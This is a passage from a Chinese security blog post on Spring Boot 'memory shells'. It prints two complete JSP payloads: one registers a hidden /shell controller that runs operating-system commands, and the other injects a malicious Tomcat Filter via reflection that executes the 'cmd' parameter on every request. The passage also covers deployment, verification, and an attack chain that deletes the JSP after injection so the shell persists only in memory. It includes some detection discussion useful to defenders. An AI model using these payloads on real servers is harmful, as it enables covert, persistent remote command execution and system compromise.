class="keyword">import</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.springframework.web.bind.annotation.RequestMethod&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.springframework.web.context.support.WebApplicationContextUtils&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// 恶意类，和 Java 版一样</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(</span></span><br><span class="line"><span class="params">                javax.servlet.http.HttpServletRequest request,</span></span><br><span class="line"><span class="params">                javax.servlet.http.HttpServletResponse response</span></span><br><span class="line"><span class="params">        )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                pb.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> pb.start();</span><br><span class="line">                java.io.<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span> ((len = is.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().write(baos.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// Step 1: 手动取 WebApplicationContext（JSP 里不能用 @Autowired）</span></span><br><span class="line">    <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils</span><br><span class="line">            .getWebApplicationContext(request.getServletContext());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: 从容器里取路由表</span></span><br><span class="line">    <span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span></span><br><span class="line">            context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">    <span class="comment">//这两个代替了原版java的@Autowired  原因就是 JSP 里没有 Spring 注解扫描，@Autowired 不生效，只能手动取。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: 构造路由规则</span></span><br><span class="line">    RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">options</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">    options.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line">    <span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">            .paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">            .methods(RequestMethod.GET, RequestMethod.POST)</span><br><span class="line">            .options(options)</span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 4: 注册进路由表（把规则、类、类方法放入 handlerMapping 实现动态注册）</span></span><br><span class="line">    <span class="type">EvilController</span> <span class="variable">evilController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getMethod(</span><br><span class="line">            <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">            javax.servlet.http.HttpServletRequest.class,</span><br><span class="line">            javax.servlet.http.HttpServletResponse.class</span><br><span class="line">    );</span><br><span class="line">    handlerMapping.registerMapping(mappingInfo, evilController, method);</span><br><span class="line"></span><br><span class="line">    response.getWriter().write(<span class="string">&quot;注入成功！访问 /shell?cmd=whoami 验证&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果直接访问 <code>http://localhost:8080/inject_jsp.jsp</code> 发现文件直接被下载了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427160148750.png"></p>
+<p>这是因为 Spring Boot 默认不支持 JSP，需要在 <code>pom.xml</code> 加依赖（注意直接放 <code>&lt;dependencies&gt;</code> 里，不是放 <code>&lt;dependencyManagement&gt;</code>的  <code>&lt;dependencies&gt;</code>里）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同时 JSP 文件要放在 <code>src/main/webapp/</code> 根目录下，不要放在 <code>WEB-INF/</code> 里（那个目录外部无法直接访问）。JSP 的路由机制和 Controller 不一样，路径就是文件在 <code>webapp/</code> 下的相对路径，文件名即路由，Tomcat 直接按文件路径映射，不需要任何控制器定义。</p>
+<blockquote>
+<p>注意区分两个目录：</p>
+<ul>
+<li><code>src/main/resources/static/</code> — Spring Boot 静态资源目录，里面的文件原样返回，不解析，JSP 放这里会被直接下载</li>
+<li><code>src/main/webapp/</code> — Web 根目录，JSP 会被 Tomcat 解析执行</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>访问 <code>http://localhost:8080/inject_jsp.jsp</code>（文件在 <code>webapp</code> 下，对应路由就是 <code>/inject_jsp.jsp</code>）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427162535837.png"></p>
+<p>访问 <code>http://localhost:8080/shell?cmd=whoami</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427162753154.png"></p>
+<p>换成 POST 方式也能请求成功（<code>request.getParameter()</code> GET 和 POST 都支持）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427162903670.png"></p>
+<p>重启应用后内存马消失，因为注册信息只存在于 JVM 内存中。</p>
+<hr>
+<h2 id="补充：Spring-Boot-下的-Tomcat-Filter-内存马"><a href="#补充：Spring-Boot-下的-Tomcat-Filter-内存马" class="headerlink" title="补充：Spring Boot 下的 Tomcat Filter 内存马"></a>补充：Spring Boot 下的 Tomcat Filter 内存马</h2><p>Spring Boot 是基于 Tomcat 的，所以 Tomcat 的内存马也是支持的，但有些地方略有不同，以 Filter 为例，直接给 POC：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 1. 获取 StandardContext</span></span><br><span class="line">    <span class="comment">// 第一个不同点：不能直接强转 request，要先反射取 request 字段再 getContext()</span></span><br><span class="line">    java.lang.reflect.<span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">innerRequest</span> <span class="operator">=</span></span><br><span class="line">            (org.apache.catalina.connector.Request) requestField.get(request);</span><br><span class="line">    org.apache.catalina.core.<span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span></span><br><span class="line">            (org.apache.catalina.core.StandardContext) innerRequest.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 定义恶意 Filter</span></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">maliciousFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">                <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> runtime.exec(cmd);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray()));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 注册 FilterDef</span></span><br><span class="line">    org.apache.tomcat.util.descriptor.web.<span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.tomcat.util.descriptor.web.FilterDef();</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(maliciousFilter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(maliciousFilter);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 注册 FilterMap（拦截所有请求）</span></span><br><span class="line">    org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.tomcat.util.descriptor.web.FilterMap();</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 强制写入 filterConfigs</span></span><br><span class="line">    <span class="comment">// 第二个不同点：filterConfigs 字段在父类里，getDeclaredField 直接找会报 NoSuchFieldException</span></span><br><span class="line">    <span class="comment">// 需要遍历父类查找</span></span><br><span class="line">    Class&lt;?&gt; clazz = standardContext.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            filterConfigsField = clazz.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    java.util.<span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (java.util.Map) filterConfigsField.get(standardContext);</span><br><span class="line"></span><br><span class="line">    java.lang.reflect.<span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> org.apache.catalina.core.ApplicationFilterConfig.class</span><br><span class="line">            .getDeclaredConstructor(org.apache.catalina.Context.class,</span><br><span class="line">                    org.apache.tomcat.util.descriptor.web.FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    org.apache.catalina.core.<span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">            (org.apache.catalina.core.ApplicationFilterConfig)</span><br><span class="line">            constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    filterConfigs.put(<span class="string">&quot;evil&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">    response.getWriter().write(<span class="string">&quot;注入成功&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>基本上是之前写的 Filter 内存马照搬过来的，但有<strong>两个不同点</strong>：</p>
+<p><strong>Spring Boot 内嵌 Tomcat 的坑：</strong></p>
+<ol>
+<li><strong>获取 <code>StandardContext</code> 方式不同</strong>：外置 Tomcat 可以直接强转 <code>request</code> 拿到，Spring Boot 里不行，要先反射取 <code>request</code> 字段，再调 <code>getContext()</code></li>
+<li><strong><code>filterConfigs</code> 字段在父类里</strong>：<code>getDeclaredField</code> 只找当前类不找父类，会直接报 <code>NoSuchFieldException</code>，需要遍历父类查找</li>
+</ol>
+<p>这两点和外置 Tomcat 不一样，实战中遇到 Spring Boot 目标要注意，最好花时间先确认一下目标环境再开始。</p>
+<p>访问 <code>http://localhost:8080/inject_filter.jsp</code> 注入：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427174543351.png"></p>
+<p>触发命令（Filter 拦截所有请求，任意路径带上 <code>cmd</code> 参数都能触发）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427174619061.png"></p>
+<hr>
+<h2 id="与-Tomcat-内存马对比"><a href="#与-Tomcat-内存马对比" class="headerlink" title="与 Tomcat 内存马对比"></a>与 Tomcat 内存马对比</h2><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>Tomcat 内存马（Filter&#x2F;Servlet）</th>
+<th>Spring Controller 内存马</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>作用层</td>
+<td>Servlet 容器层</td>
+<td>Spring MVC 框架层</td>
+</tr>
+<tr>
+<td>注册方式</td>
+<td>反射修改容器内部集合</td>
+<td>官方公开 API <code>registerMapping()</code></td>
+</tr>
+<tr>
+<td>适用条件</td>
+<td>任意 Java Web 应用</td>
+<td>需要 Spring MVC 环境</td>
+</tr>
+<tr>
+<td>隐蔽性</td>
+<td>较高</td>
+<td>中等（路由可被枚举）</td>
+</tr>
+<tr>
+<td>检测难度</td>
+<td>需扫描容器组件</td>
+<td>可通过 Actuator <code>/mappings</code> 暴露</td>
+</tr>
+</tbody></table>
+<p>值得注意的是，Spring 官方提供了 <code>registerMapping()</code> 这个公开 API，这意味着注册动作本身不会触发任何安全告警——从框架角度看这是”合法操作”。但也正因为如此，通过 Spring Actuator 的 <code>/actuator/mappings</code> 端点是可以枚举到动态注册的路由的，这是 Controller 内存马相比 Interceptor 内存马稍弱的一点。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Spring Controller 内存马的核心就三步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">拿到路由表（RequestMappingHandlerMapping）</span><br><span class="line">        ↓</span><br><span class="line">构造路由规则（RequestMappingInfo）</span><br><span class="line">        ↓</span><br><span class="line">registerMapping() 注册（路由规则 + 恶意对象 + 方法）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>实战攻击链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞 → 传恶意 JSP → 访问 JSP 触发注入 → 删除 JSP 文件 → 内马留在内存</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>下一篇写 Interceptor 内存马，注册方式需要反射修改私有字段，但因为不产生新路由，任意请求都能触发，隐蔽性更强。</p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-Controller-%E2%80%94%E2%80%94-SpringBoot-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">原理分析 | Controller —— SpringBoot 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-MVC-%E5%9F%BA%E7%A1%80"><span class="toc-text">Spring MVC 基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-Boot-%E5%AE%8C%E6%95%B4%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B"><span class="toc-text">Spring Boot 完整请求流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="toc-text">内存马原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Demo-%E5%AE%9E%E7%8E%B0"><span class="toc-text">Java Demo 实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-handlerMapping-%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF"><span class="toc-text">获取 handlerMapping 的两种姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSP-Payload-%E5%AE%9E%E7%8E%B0"><span class="toc-text">JSP Payload 实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-text">验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9ASpring-Boot-%E4%B8%8B%E7%9A%84-Tomcat-Filter-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">补充：Spring Boot 下的 Tomcat Filter 内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8E-Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AF%B9%E6%AF%94"><span class="toc-text">与 Tomcat 内存马对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
